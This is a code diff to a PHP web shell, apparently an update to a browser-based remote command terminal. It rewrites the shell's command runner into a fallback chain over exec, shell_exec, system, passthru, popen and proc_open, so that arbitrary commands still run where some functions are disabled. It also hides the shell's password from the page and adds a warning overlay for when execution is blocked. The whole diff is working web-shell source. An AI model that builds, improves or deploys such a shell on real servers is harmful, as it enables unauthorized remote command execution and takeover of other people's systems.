@@ -47,33 +47,60 @@ function allFunctionExist($list = array()) {
     return true;
 }
 
+function getExecuteFunctionName() {
+    if (function_exists('exec')) {
+        return 'exec';
+    }
+    if (function_exists('shell_exec')) {
+        return 'shell_exec';
+    }
+    if (allFunctionExist(array('system', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
+        return 'system';
+    }
+    if (allFunctionExist(array('passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
+        return 'passthru';
+    }
+    if (allFunctionExist(array('popen', 'feof', 'fread', 'pclose'))) {
+        return 'popen';
+    }
+    if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {
+        return 'proc_open';
+    }
+    return null;
+}
+
 function executeCommand($cmd) {
     $output = '';
-    if (function_exists('exec')) {
-        exec($cmd, $output);
-        $output = implode("\n", $output);
-    } else if (function_exists('shell_exec')) {
-        $output = shell_exec($cmd);
-    } else if (allFunctionExist(array('system', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
-        ob_start();
-        system($cmd);
-        $output = ob_get_contents();
-        ob_end_clean();
-    } else if (allFunctionExist(array('passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
-        ob_start();
-        passthru($cmd);
-        $output = ob_get_contents();
-        ob_end_clean();
-    } else if (allFunctionExist(array('popen', 'feof', 'fread', 'pclose'))) {
-        $handle = popen($cmd, 'r');
-        while (!feof($handle)) {
-            $output .= fread($handle, 4096);
-        }
-        pclose($handle);
-    } else if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {
-        $handle = proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);
-        $output = stream_get_contents($pipes[1]);
-        proc_close($handle);
+    switch (getExecuteFunctionName()) {
+        case 'exec':
+            exec($cmd, $lines);
+            $output = implode("\n", $lines);
+            break;
+        case 'shell_exec':
+            $output = shell_exec($cmd);
+            break;
+        case 'system':
+            ob_start();
+            system($cmd);
+            $output = ob_get_clean();
+            break;
+        case 'passthru':
+            ob_start();
+            passthru($cmd);
+            $output = ob_get_clean();
+            break;
+        case 'popen':
+            $handle = popen($cmd, 'r');
+            while (!feof($handle)) {
+                $output .= fread($handle, 4096);
+            }
+            pclose($handle);
+            break;
+        case 'proc_open':
+            $handle = proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);
+            $output = stream_get_contents($pipes[1]);
+            proc_close($handle);
+            break;
     }
     return $output;
 }
@@ -179,6 +206,8 @@ function initShellConfig() {
     if ($hostname !== false) {
         $SHELL_CONFIG['hostname'] = $hostname;
     }
+
+    $SHELL_CONFIG['exec_function'] = getExecuteFunctionName();
 }
 
 if (isset($_GET["feature"])) {
@@ -378,10 +407,44 @@ if (isset($_GET["feature"])) {
             #shell-input input {
                 outline: none;
             }
+
+            #shell-warning {
+                position: fixed;
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                background: rgba(0, 0, 0, .75);
+                display: none;
+                align-items: center;
+                justify-content: center;
+                z-index: 10;
+            }
+
+            .shell-warning-box {
+                background: #222;
+                border: 1px solid #FF4180;
+                padding: 20px;
+                max-width: 480px;
+                color: #eee;
+                font-family: monospace;
+                font-size: 10pt;
+            }
+
+            .shell-warning-box button {
+                display: block;
+                margin-top: 15px;
+                background: #FF4180;
+                color: #fff;
+                border: none;
+                padding: 8px 16px;
+                font-family: monospace;
+                cursor: pointer;
+            }
         </style>
 
         <script>
-            var SHELL_CONFIG = <?php echo json_encode($SHELL_CONFIG); ?>;
+            var SHELL_CONFIG = <?php echo json_encode(array_diff_key($SHELL_CONFIG, array('password' => 1))); ?>;
             var CWD = null;
             var commandHistory = [];
             var historyPosition = 0;
@@ -651,11 +714,25 @@ if (isset($_GET["feature"])) {
                 }
             };
 
+            function showExecWarning() {
+                eShellCmdInput.disabled = true;
+                var overlay = document.getElementById("shell-warning");
+                overlay.style.display = "flex";
+                document.getElementById("shell-warning-continue").onclick = function () {
+                    overlay.style.display = "none";
+                    eShellCmdInput.disabled = false;
+                    eShellCmdInput.focus();
+                };
+            }
+
             window.onload = function() {
                 eShellCmdInput = document.getElementById("shell-cmd");
                 eShellContent = document.getElementById("shell-content");
                 updateCwd();
                 eShellCmdInput.focus();
+                if (!SHELL_CONFIG.exec_function) {
+                    showExecWarning();
+                }
             };
         </script>
     </head>
@@ -683,5 +760,12 @@ if (isset($_GET["feature"])) {
             </div>
         </div>
     </body>
+
+    <div id="shell-warning">
+        <div class="shell-warning-box">
+            <strong>Warning:</strong> shell execution functions (exec, shell_exec, system, passthru, popen, proc_open) appear to be disabled on this server (possibly via php.ini <code>disable_functions</code>). Commands will likely produce no output.
+            <button id="shell-warning-continue" autofocus>Continue anyway</button>
+        </div>
+    </div>
 
 </html>
